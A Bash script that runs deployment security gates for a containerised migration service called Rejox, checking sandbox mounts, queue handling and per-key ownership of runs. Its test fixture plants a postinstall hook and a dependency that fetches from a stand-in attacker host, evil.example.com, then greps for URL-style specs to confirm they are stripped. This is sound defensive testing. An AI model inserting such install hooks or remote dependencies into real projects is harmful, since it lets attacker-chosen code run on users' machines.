#!/usr/bin/env bash
#
# Rejox — the deployment gates from docs/PRE-LAUNCH-CHECKLIST.md, as one run.
#
#   ./verify-deployment.sh
#
# Asserts what only a real `docker compose up` can: that a worker in a container
# can ask the HOST's daemon for a sandbox and have it mount the right directory,
# that a migration crosses the queue into another process and comes back, and
# that a dead queue is a clean 503 rather than a quiet in-process fallback.
#
# This is the geometry the unit tests cannot reproduce. `pytest -m sandbox_live`
# runs section A against a daemon, but as a process ON the host — where every
# path it names is a path the daemon already shares, so the sibling-container
# mismatch can never occur. Here it can. That is the point of this script.
#
# Gates covered: A0, A1, A8, A9, B0, B1, B2, B3, B5, C3.
# Exits non-zero on the first failure, and dumps the service logs when it does.

set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$ROOT"

: "${REJOX_DATA_DIR:?set REJOX_DATA_DIR — the workspace root, bind-mounted at the same path on both sides}"
: "${REJOX_DOCKER_GID:?set REJOX_DOCKER_GID — the gid owning /var/run/docker.sock (stat -c '%g' /var/run/docker.sock; 0 on Docker Desktop)}"
export REJOX_API_KEYS="${REJOX_API_KEYS:-gate-key-alpha,gate-key-bravo}"
export REJOX_AI_PROVIDER="${REJOX_AI_PROVIDER:-fake}"
export REJOX_SANDBOX_MEMORY="${REJOX_SANDBOX_MEMORY:-2g}"

KEY="${REJOX_API_KEYS%%,*}"
H="X-API-Key: $KEY"
API="http://localhost:${REJOX_PORT:-8000}"
# A migration installs a dependency tree, type-checks and runs Metro.
MIGRATE_TIMEOUT="${MIGRATE_TIMEOUT:-1800}"

WORK="$(mktemp -d)"
FAILED=0

# --- reporting ---------------------------------------------------------------

pass() { printf '  \033[32mPASS\033[0m  %s\n' "$1"; }
fail() { printf '  \033[31mFAIL\033[0m  %s\n' "$1"; FAILED=1; }
gate() { printf '\n\033[1m%s\033[0m\n' "$1"; }

# check <gate> <expected> <actual>
check() {
  if [ "$2" = "$3" ]; then pass "$1 — $3"; else fail "$1 — expected [$2], got [$3]"; fi
}

cleanup() {
  local rc=$?
  if [ "$FAILED" -ne 0 ] || [ "$rc" -ne 0 ]; then
    printf '\n\033[1m--- service logs (last 60 lines each) ---\033[0m\n'
    docker compose logs --tail 60 api worker 2>&1 | tail -150
  fi
  docker compose down -v >/dev/null 2>&1 || true
  rm -rf "$WORK"
  [ "$FAILED" -eq 0 ] || exit 1
}
trap cleanup EXIT

# --- preflight ---------------------------------------------------------------

gate "Preflight — the workspace root must be writable by the image's uid (10001)"
if [ ! -d "$REJOX_DATA_DIR" ]; then
  fail "$REJOX_DATA_DIR does not exist. Create it:
        sudo mkdir -p $REJOX_DATA_DIR && sudo chown -R 10001:10001 $REJOX_DATA_DIR"
  exit 1
fi
pass "$REJOX_DATA_DIR exists"

# --- B0 ----------------------------------------------------------------------

gate "B0 — all three services come up and stay up"
docker compose up -d --build >/dev/null 2>&1 || { fail "compose up failed"; exit 1; }

deadline=$((SECONDS + 180))
until curl -sf "$API/health" >/dev/null 2>&1; do
  [ "$SECONDS" -lt "$deadline" ] || { fail "the API never became healthy"; exit 1; }
  sleep 2
done
check "health" '{"status":"ok"}' "$(curl -s "$API/health")"

for svc in redis api worker; do
  state="$(docker compose ps "$svc" --format '{{.State}}' 2>/dev/null)"
  check "$svc is running" "running" "$state"
done

# --- A0 ----------------------------------------------------------------------

gate "A0 — the worker can reach a Docker daemon"
ver="$(docker compose exec -T worker sh -c 'docker version --format "{{.Server.Version}}"' 2>&1 | tr -d '\r')"
if printf '%s' "$ver" | grep -qE '^[0-9]+\.'; then
  pass "daemon reachable from the worker — $ver"
else
  fail "worker cannot reach the daemon: $ver"
  exit 1   # every gate below is meaningless without this
fi

# --- A1 ----------------------------------------------------------------------
#
# The gate this whole script exists for: the worker is a container asking the
# HOST's daemon to bind-mount a path the worker named. If the two disagree the
# daemon creates an empty directory and mounts THAT, and every stage validates
# nothing while reporting success.

gate "A1 — the sandbox is handed the real run directory"
canary="$(docker compose exec -T worker python - <<'PY' 2>&1 | tail -1
from pathlib import Path
import os
from app.pipeline.sandbox import run, SandboxPolicy, SandboxError

d = Path(os.environ["REJOX_WORKSPACE_ROOT"]) / "gate-probe"
d.mkdir(parents=True, exist_ok=True)
(d / "canary.txt").write_text("canary-a1")
try:
    print(run(["cat", "canary.txt"], d, 120, policy=SandboxPolicy.from_env()).stdout.strip())
except SandboxError as exc:
    print("SANDBOX-ERROR:", str(exc).replace("\n", " ")[:200])
PY
)"
check "canary read back through the mount" "canary-a1" "$canary"

# --- B1 ----------------------------------------------------------------------

gate "B1 — the worker is registered with Redis"
workers="$(docker compose exec -T redis redis-cli SMEMBERS rq:workers 2>/dev/null | tr -d '\r' | grep -c 'rq:worker:')"
if [ "$workers" -ge 1 ]; then
  pass "$workers worker(s) registered"
else
  fail "no worker registered with the queue — it is up but not consuming"
fi

# --- the fixture -------------------------------------------------------------
#
# The benchmark project, plus the two things an uploader would plant: a
# lifecycle script, and a dependency spec pointing somewhere of their choosing.
# Migrating this covers A8 and A9 on the same run as B2.

gate "Fixture — sample-app carrying a hostile postinstall and a URL dependency"
cp -r test-projects/sample-app "$WORK/src"
rm -rf "$WORK/src/node_modules" "$WORK/src/dist"
jq '.scripts += {"postinstall":"echo rejox-canary-a8"}
    | .dependencies += {"evil-pkg":"https://evil.example.com/pkg.tgz"}' \
   "$WORK/src/package.json" > "$WORK/pj" && mv "$WORK/pj" "$WORK/src/package.json"
( cd "$WORK" && zip -qr fixture.zip src )
pass "built $(du -h "$WORK/fixture.zip" | cut -f1)"

# --- B2 ----------------------------------------------------------------------

gate "B2 — a full migration completes through the queue"
RUN_ID="$(curl -s -X POST "$API/api/upload" -H "$H" -F "file=@$WORK/fixture.zip" | jq -r '.runId // empty')"
[ -n "$RUN_ID" ] || { fail "upload returned no runId"; exit 1; }
pass "uploaded — runId $RUN_ID"

JOB_ID="$(curl -s -X POST "$API/api/migrate" -H "$H" -H 'Content-Type: application/json' \
            -d "{\"runId\":\"$RUN_ID\"}" | jq -r '.jobId // empty')"
[ -n "$JOB_ID" ] || { fail "migrate returned no jobId"; exit 1; }
pass "enqueued — jobId $JOB_ID"

# A migration that "succeeds" without a sandbox container ever existing did not
# run what it claims to have run, so watch the host while it works.
( while true; do docker ps --format '{{.Image}}' >> "$WORK/seen"; sleep 5; done ) &
WATCH=$!
# Job control would otherwise print "Terminated" into the middle of the report
# when this is killed below.
disown "$WATCH" 2>/dev/null || true

status=""
deadline=$((SECONDS + MIGRATE_TIMEOUT))
while [ "$SECONDS" -lt "$deadline" ]; do
  status="$(curl -s "$API/api/jobs/$JOB_ID" -H "$H" | jq -r '.status // "unreachable"')"
  case "$status" in succeeded|failed) break ;; esac
  sleep 10
done
kill "$WATCH" 2>/dev/null

check "migration status" "succeeded" "$status"
if [ "$status" != "succeeded" ]; then
  curl -s "$API/api/jobs/$JOB_ID" -H "$H" | jq '{status, error, events: [.events[] | {stage, type, message}]}'
fi

if grep -q "$(docker compose exec -T api sh -c 'printf %s "$REJOX_SANDBOX_IMAGE"' 2>/dev/null | tr -d '\r')" "$WORK/seen" 2>/dev/null; then
  pass "a sibling sandbox container was observed on the host during the run"
else
  fail "no sandbox container ever appeared — the stages did not run contained"
fi

# --- B3 ----------------------------------------------------------------------

gate "B3 — the emitted project is downloadable and real"
code="$(curl -s -o "$WORK/out.zip" -w '%{http_code}' "$API/api/runs/$RUN_ID/download" -H "$H")"
check "download" "200" "$code"
files="$(unzip -l "$WORK/out.zip" 2>/dev/null | tail -1 | awk '{print $2}')"
if [ "${files:-0}" -ge 20 ]; then
  pass "$files files in the archive"
else
  fail "only ${files:-0} files — an empty-looking output"
fi
check "no mount probe leaked into the artifact" "0" \
      "$(unzip -l "$WORK/out.zip" 2>/dev/null | grep -c 'rejox-mount-probe')"

# --- A8 / A9 -----------------------------------------------------------------

gate "A8 — the uploaded project's npm scripts never reach the output"
unzip -p "$WORK/out.zip" package.json > "$WORK/emitted.json" 2>/dev/null
check "hostile postinstall occurrences" "0" "$(grep -c 'rejox-canary' "$WORK/emitted.json")"
check "emitted scripts" "android ios start web" \
      "$(jq -r '.scripts | keys | join(" ")' "$WORK/emitted.json")"

gate "A9 — a non-registry dependency spec never reaches npm install"
check "url-ish dependency specs" "0" \
      "$(jq -r '.dependencies | to_entries[] | .value' "$WORK/emitted.json" \
         | grep -cE '(https?://|git\+|file:|github:|npm:)')"
check "evil-pkg carried over" "" \
      "$(jq -r '.dependencies["evil-pkg"] // empty' "$WORK/emitted.json")"

# --- C3 ----------------------------------------------------------------------
#
# Run against the SAME run B2 just migrated: a real upload with real source in
# it, not a synthetic id. The second key is a legitimate, authenticated caller —
# the question is only whether authentication is being mistaken for authorization.

gate "C3 — a run belongs to one identity and no other"
KEY_B="$(printf '%s' "$REJOX_API_KEYS" | cut -d, -f2)"
if [ -z "$KEY_B" ] || [ "$KEY_B" = "$KEY" ]; then
  fail "REJOX_API_KEYS must carry two distinct keys for this gate"
else
  HB="X-API-Key: $KEY_B"
  MISSING="00000000000000000000000000000000"

  check "download as the owner" "200" \
        "$(curl -s -o /dev/null -w '%{http_code}' "$API/api/runs/$RUN_ID/download" -H "$H")"
  check "download as a stranger" "404" \
        "$(curl -s -o "$WORK/c3-stranger.json" -w '%{http_code}' "$API/api/runs/$RUN_ID/download" -H "$HB")"
  check "job as a stranger" "404" \
        "$(curl -s -o /dev/null -w '%{http_code}' "$API/api/jobs/$JOB_ID" -H "$HB")"
  check "event stream as a stranger" "404" \
        "$(curl -s -o /dev/null -w '%{http_code}' "$API/api/jobs/$JOB_ID/events" -H "$HB")"
  check "plan as a stranger" "404" \
        "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$API/api/plan" -H "$HB" \
             -H 'Content-Type: application/json' -d "{\"runId\":\"$RUN_ID\"}")"

  # A 403 — or a different message — would confirm the run exists, which is
  # itself a disclosure. Someone else's run must read exactly like a missing one.
  curl -s -o "$WORK/c3-absent.json" "$API/api/runs/$MISSING/download" -H "$HB"
  check "a run that does not exist" \
        "No such run: $MISSING" "$(jq -r '.detail' "$WORK/c3-absent.json")"
  check "the two messages have the same shape" \
        "No such run: $RUN_ID" "$(jq -r '.detail' "$WORK/c3-stranger.json")"

  # Local-path mode reads a server directory the caller names, which is a way
  # past ownership entirely. It must be off unless a deployment opts in.
  check "local-path mode is refused" "403" \
        "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$API/api/parse" -H "$H" \
             -H 'Content-Type: application/json' -d '{"path":"/srv"}')"
fi

# --- B5 ----------------------------------------------------------------------

gate "B5 — a dead queue is a clean 503, never an in-process fallback"
docker compose stop redis >/dev/null 2>&1
started=$SECONDS
code="$(curl -s -o "$WORK/b5.json" -w '%{http_code}' -X POST "$API/api/migrate" \
          -H "$H" -H 'Content-Type: application/json' -d "{\"runId\":\"$RUN_ID\"}")"
elapsed=$((SECONDS - started))
check "status with Redis down" "503" "$code"
if [ "$elapsed" -le 15 ]; then
  pass "answered in ${elapsed}s (must not hang)"
else
  fail "took ${elapsed}s — an unreachable queue must fail fast, not stall the client"
fi
if grep -qi 'redis' "$WORK/b5.json"; then
  pass "the body names the queue: $(head -c 120 "$WORK/b5.json")"
else
  fail "the 503 does not say what was unreachable: $(head -c 120 "$WORK/b5.json")"
fi
docker compose start redis >/dev/null 2>&1

# --- verdict -----------------------------------------------------------------

printf '\n'
if [ "$FAILED" -eq 0 ]; then
  printf '\033[32mAll deployment gates passed.\033[0m Sign them in docs/PRE-LAUNCH-CHECKLIST.md.\n'
else
  printf '\033[31mDeployment gates FAILED.\033[0m Nothing below a red gate is trustworthy.\n'
fi
